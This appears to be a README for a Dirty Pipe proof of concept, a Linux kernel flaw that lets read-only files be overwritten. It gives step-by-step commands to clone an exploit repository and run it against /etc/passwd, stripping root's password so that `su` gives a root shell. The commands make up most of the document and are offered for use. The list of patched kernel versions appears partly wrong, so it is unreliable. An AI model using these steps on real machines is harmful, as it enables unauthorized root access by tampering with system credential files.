# Dirty-Pipe (PoC)

![image1](https://i.imgur.com/VDCLoTZ.png)

# What is it?

Dirty-Pipe is a vulnerability which allows us to overwrite files even if they have read-only permissions. This vulnerability affects kernel versions 5.8 onwards. This vulnerability has reportedly been patched for kernel versions 5.10.102, 5.12.25 and 5.16.11.

---

1. First of all, we must clone the repository where the exploit is located. 

```bash
git clone https://github.com/Nekoox/dirty-pipe.git
```

2. Once cloned, we enter the directory and execute the exploit with the following syntax.

```bash
cd dirty-pipe
```

````bash
./exploit /etc/passwd 1 "${$(cat /etc/passwd)/root:x/oot:}"
````

3. Once run, if the kernel version is vulnerable, it should work fine. We change to root.

```bash
su
```

![image](https://i.imgur.com/D2Qm4qh.png)

And as we can see we have successfully exploited Dirty-Pipe!
